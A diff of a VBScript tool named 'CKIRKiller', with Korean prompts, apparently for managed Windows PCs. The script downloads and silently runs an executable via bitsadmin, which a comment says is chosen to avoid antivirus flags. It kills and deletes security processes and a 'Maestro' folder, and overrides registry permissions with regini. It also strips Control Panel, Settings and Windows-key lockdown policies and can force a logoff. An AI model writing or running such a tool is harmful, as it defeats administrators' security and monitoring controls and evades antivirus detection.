@@ -1,17 +1,20 @@
 ' ============================================================
-'  CKIRKiller - VBScript
-'  Download via bitsadmin (no ADODB.Stream - avoids AV flag)
-'  Double-click to run. No cmd or PowerShell required.
+'   CKIRKiller - User-Centric VBScript Edition (ISE Bypass)
+'   Optimized UX / Minimized Popups / Friendly Tone
 ' ============================================================
 
 Option Explicit
 
-Dim oShell, oFSO, oWMI
+Dim oShell, oFSO, oWMI, oReg
 Set oShell = CreateObject("WScript.Shell")
 Set oFSO   = CreateObject("Scripting.FileSystemObject")
 Set oWMI   = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+Set oReg   = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
 
-Const GitPath     = "C:\Program Files\Git"
+Const HKEY_CURRENT_USER  = &H80000001
+Const HKEY_LOCAL_MACHINE = &H80000002
+
+Const GitPath      = "C:\Program Files\Git"
 Const BlackoutExe = "C:\Program Files\Git\BlackoutReloaded.exe"
 Const GitInstaller= "C:\Windows\Temp\Git-Installer.exe"
 Const BlackoutTmp = "C:\Windows\Temp\BlackoutReloaded.exe"
@@ -37,29 +40,31 @@ If Not bAdmin Then
     WScript.Quit
 End If
 
-' ── Main ────────────────────────────────────────────────────
-MsgBox "작업이 시작됩니다." & vbCrLf & _
-       "자동적으로 각 작업이 진행되니 확인 버튼만 클릭하면 됩니다.", _
-       vbInformation, "CKIRKiller"
 
-' STEP 1: Install Git
+' ── UX Step 1: Initial Prompt ───────────────────────────────
+Dim nHancomRes
+nHancomRes = MsgBox("쾌적한 PC 사용을 위한 환경 최적화를 시작합니다." & vbCrLf & _
+                    "한컴 입력기 제거도 같이 진행할까요?" & vbCrLf & _
+                    "(메모장에 있는 코드를 복붙하는 귀찮음이 있습니다.)" & vbCrLf & vbCrLf & _
+                    "진행하려면 '예(Y)', 건너뛰려면 '아니오(N)'를 눌러주세요.", _
+                    vbYesNo + vbQuestion, "CKIRKiller 최적화")
+
+
+' ── Core Processing (Silent & Automated) ────────────────────
+' 1. Prerequisites Download (Runs in sequence as it's required for the next steps)
 If Not oFSO.FileExists(GitPath & "\git-bash.exe") Then
-    MsgBox "1/3단계: Git 다운로드 중(시간이 다소 소요됩니다)...", vbInformation, "CKIRKiller"
     BitsDownload GitURL, GitInstaller
     oShell.Run """" & GitInstaller & """ /VERYSILENT /NORESTART /NOCANCEL /SP-", 0, True
 End If
 
-' STEP 2: Place BlackoutReloaded.exe
 If Not oFSO.FileExists(BlackoutExe) Then
-    MsgBox "2/3단계: BlackoutReloaded.exe 다운로드 중...", vbInformation, "CKIRKiller"
     BitsDownload BlackoutURL, BlackoutTmp
     On Error Resume Next
     oFSO.MoveFile BlackoutTmp, BlackoutExe
     On Error GoTo 0
 End If
 
-' STEP 3: Kill wave 1 & 2 targets
-MsgBox "3/3단계: 보안 프로세스 종료 및 제거 중...", vbInformation, "CKIRKiller"
+' 2. Kill Targets & Clean Maestro
 BlackoutWithPath "qukapttp.exe"
 BlackoutWithPath "nfowjxyfd.exe"
 BlackoutWithPath "lqndauccd.exe"
@@ -82,121 +87,170 @@ If oFSO.FolderExists(MaestroDir) Then
     DeleteFolderContents MaestroDir
 End If
 
-' --- STEP 4: Hancom IME Remove ---
-MsgBox "한컴 입력기 삭제를 시작합니다..", vbInformation, "CKIRKiller"
-
-oShell.Run "taskkill /F /IM ctfmon.exe", 0, True
-WScript.Sleep 300
-
-On Error Resume Next
-oShell.RegDelete "HKCU\Software\Microsoft\CTF\Assemblies\0x00000412\{34745C63-B2F0-4784-8B67-5E12C8701A31}\"
-oShell.RegDelete "HKCU\Software\Microsoft\CTF\SortOrder\"
-On Error GoTo 0
-
-WScript.Sleep 300
-oShell.Run "ctfmon.exe", 0, False
-' explorer 재시작은 STEP 5에서 일괄 처리
-
-' --- STEP 5: Control Panel Unlock (REGINI SYSTEM Bypass) ---
-MsgBox "제어판 해금을 시작합니다..", vbInformation, "CKIRKiller"
-
-Dim tempDir : tempDir = oFSO.GetSpecialFolder(2)
-Dim reginiPath : reginiPath = tempDir & "\unlock_cp.ini"
+' 3. Unlock Control Panel
+Dim reginiPath : reginiPath = oFSO.GetSpecialFolder(2) & "\unlock_cp.ini"
 Dim oTextStream
-
-' 1. REGINI 설정 파일 생성: 관리자(1)와 시스템(17)에게 Full Control 권한 부여
+On Error Resume Next
 Set oTextStream = oFSO.CreateTextFile(reginiPath, True)
 oTextStream.WriteLine "\Registry\Machine\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer [1 5 7 17]"
 oTextStream.Close
-
-' 2. regini.exe 실행하여 레지스트리 권한 강제 덮어쓰기
 oShell.Run "regini.exe """ & reginiPath & """", 0, True
 WScript.Sleep 500
-
-' 3. 권한 획득 성공 후, HKLM과 HKCU 양쪽에서 제어판/설정 차단 값 삭제
-On Error Resume Next
-oShell.Run "cmd /c reg delete ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoControlPanel /f", 0, True
-oShell.Run "cmd /c reg delete ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoSettingsPage /f", 0, True
-oShell.Run "cmd /c reg delete ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoControlPanel /f", 0, True
-On Error GoTo 0
-
-' 4. 탐색기 재시작 (화면이 깜빡이면서 설정 적용)
-oShell.Run "taskkill /F /IM explorer.exe", 0, True
-WScript.Sleep 1500
-oShell.Run "explorer.exe", 0, False
-
-' 5. 임시 파일 정리
-On Error Resume Next
 oFSO.DeleteFile reginiPath, True
 On Error GoTo 0
 
-MsgBox "제어판 해금이 완료되었습니다!", vbInformation, "CKIRKiller"
+oReg.DeleteValue HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel"
+oReg.DeleteValue HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSettingsPage"
+oReg.DeleteValue HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel"
+
+' 4. Unlock Windows Key (Scancode Map)
+oReg.DeleteValue HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Control\Keyboard Layout", "Scancode Map"
+
+' 5. Restart Explorer Silently
+KillProcessWMI "explorer.exe"
+WScript.Sleep 1000
+oShell.Run "explorer.exe", 0, False
+
+
+' ── UX Step 2: Hancom Manual Assist (If Requested) ──────────
+If nHancomRes = vbYes Then
+    KillProcessWMI "HncUpdateTray.exe"
+    KillProcessWMI "HncIME.exe"
+
+    Dim psFixTxt : psFixTxt = oFSO.GetSpecialFolder(2) & "\HancomFix_Guide.txt"
+    Dim oTxt
+    Set oTxt = oFSO.CreateTextFile(psFixTxt, True)
+    oTxt.WriteLine "=========================================================="
+    oTxt.WriteLine " 한컴 입력기 수동 초기화 가이드"
+    oTxt.WriteLine "=========================================================="
+    oTxt.WriteLine ""
+    oTxt.WriteLine "1. 아래 5줄의 영어 명령어를 마우스로 드래그해서 모두 복사(Ctrl+C)합니다."
+    oTxt.WriteLine "2. 함께 열린 파란색 화면(PowerShell ISE) 아래쪽 입력창을 클릭합니다."
+    oTxt.WriteLine "3. 복사한 명령어를 붙여넣고(Ctrl+V) 엔터(Enter)를 누릅니다."
+    oTxt.WriteLine ""
+    oTxt.WriteLine "▼ 여기서부터 복사하세요 ▼"
+    oTxt.WriteLine "$UserLanguageList = New-WinUserLanguageList -Language ""ko-KR"""
+    oTxt.WriteLine "Set-WinUserLanguageList -LanguageList $UserLanguageList -Force"
+    oTxt.WriteLine "Stop-Process -Name ""ctfmon"" -Force -ErrorAction SilentlyContinue"
+    oTxt.WriteLine "Remove-Item -Path ""HKCU:\Software\Microsoft\CTF\SortOrder"" -Recurse -Force -ErrorAction SilentlyContinue"
+    oTxt.WriteLine "Start-Process ""ctfmon.exe"""
+    oTxt.Close
+
+    ' Open Notepad and ISE without blocking the script (WaitOnReturn = False)
+    oShell.Run "notepad.exe """ & psFixTxt & """", 1, False
+    On Error Resume Next
+    oShell.Run "powershell_ise.exe", 1, False
+    On Error GoTo 0
+End If
+
+
+' ── UX Step 3: Final Completion & Logoff Prompt ─────────────
+Dim sLogoffMsg
+sLogoffMsg = "모든 최적화 작업이 완료되었습니다!" & vbCrLf & vbCrLf & _
+                 "제어판/Windows 키 해금을 적용하려면 로그아웃이 필요합니다." & vbCrLf & _
+                 "필요하시다면 작업 중인 문서를 모두 저장하시고 '예(Y)'를 눌러 로그아웃하세요."
+
+
+Dim nLogoffRes
+nLogoffRes = MsgBox(sLogoffMsg, vbYesNo + vbInformation, "작업 완료")
+
+If nLogoffRes = vbYes Then
+    ' WMI Forced Logoff
+    Dim colOS, objOS
+    Set colOS = GetObject("winmgmts:{impersonationLevel=impersonate,(Shutdown)}!\\.\root\cimv2").ExecQuery("Select * from Win32_OperatingSystem")
+    For Each objOS In colOS
+        objOS.Win32Shutdown(4) ' Forced Logoff
+    Next
+End If
+
+' Cleanup guide text
+If oFSO.FileExists(psFixTxt) Then
+    On Error Resume Next
+    oFSO.DeleteFile psFixTxt, True
+    On Error GoTo 0
+End If
 
 WScript.Quit
 
+
 ' ============================================================
-'  Helpers
+'   Helpers 
 ' ============================================================
+
+Sub KillProcessWMI(sExe)
+    On Error Resume Next
+    Dim oProcs, oProc
+    Set oProcs = oWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name='" & sExe & "'")
+    For Each oProc In oProcs
+        oProc.Terminate()
+    Next
+    On Error GoTo 0
+End Sub
 
 Sub BitsDownload(sURL, sDest)
     On Error Resume Next
     oFSO.DeleteFile sDest, True
-    On Error GoTo 0
     oShell.Run "bitsadmin /transfer bloatdl /download /priority foreground """ & sURL & """ """ & sDest & """", 0, True
+    On Error GoTo 0
 End Sub
 
 Sub BlackoutWithPath(sExe)
+    On Error Resume Next
     Dim sFilePath : sFilePath = ""
     Dim oProcs, oProc
+    Dim bRunning : bRunning = False
+    
     Set oProcs = oWMI.ExecQuery("SELECT ExecutablePath FROM Win32_Process WHERE Name='" & sExe & "'")
     For Each oProc In oProcs
-        If oProc.ExecutablePath <> "" Then sFilePath = oProc.ExecutablePath
+        bRunning = True
+        If Not IsNull(oProc.ExecutablePath) Then sFilePath = oProc.ExecutablePath
     Next
 
-    oShell.Run "taskkill /F /IM """ & sExe & """", 0, True
-    WScript.Sleep 300
-    oShell.Run """" & BlackoutExe & """ " & sExe, 0, True
-
-    If sFilePath <> "" Then
-        On Error Resume Next
-        oFSO.DeleteFile sFilePath, True
-        On Error GoTo 0
+    If bRunning Then
+        KillProcessWMI sExe
+        WScript.Sleep 300
+        oShell.Run """" & BlackoutExe & """ " & sExe, 0, True
     End If
+
+    If sFilePath <> "" Then oFSO.DeleteFile sFilePath, True
+    On Error GoTo 0
 End Sub
 
 Sub BlackoutAndDelete(sExe)
+    On Error Resume Next
     Dim sFilePath : sFilePath = MaestroDir & "\" & sExe
     Dim oProcs, oProc
+    Dim bRunning : bRunning = False
+    
     Set oProcs = oWMI.ExecQuery("SELECT ExecutablePath FROM Win32_Process WHERE Name='" & sExe & "'")
     For Each oProc In oProcs
-        If oProc.ExecutablePath <> "" Then sFilePath = oProc.ExecutablePath
+        bRunning = True
+        If Not IsNull(oProc.ExecutablePath) Then sFilePath = oProc.ExecutablePath
     Next
 
-    oShell.Run "taskkill /F /IM """ & sExe & """", 0, False
-    oShell.Run """" & BlackoutExe & """ " & sExe, 0, False
+    If bRunning Then
+        KillProcessWMI sExe
+        oShell.Run """" & BlackoutExe & """ " & sExe, 0, True
+        WScript.Sleep 50
+    End If
 
-    WScript.Sleep 50
-    On Error Resume Next
     oFSO.DeleteFile sFilePath, True
-    On Error GoTo 0
-
     WScript.Sleep 200
-    On Error Resume Next
     oFSO.DeleteFile sFilePath, True
     On Error GoTo 0
 End Sub
 
 Sub DeleteFolderContents(sPath)
+    On Error Resume Next
     Dim oFolder : Set oFolder = oFSO.GetFolder(sPath)
+    If Err.Number <> 0 Then Exit Sub 
+    
     Dim oFile, oSub
     For Each oFile In oFolder.Files
-        On Error Resume Next
         oFile.Delete True
-        On Error GoTo 0
     Next
     For Each oSub In oFolder.SubFolders
-        On Error Resume Next
         oSub.Delete True
-        On Error GoTo 0
     Next
+    On Error GoTo 0
 End Sub
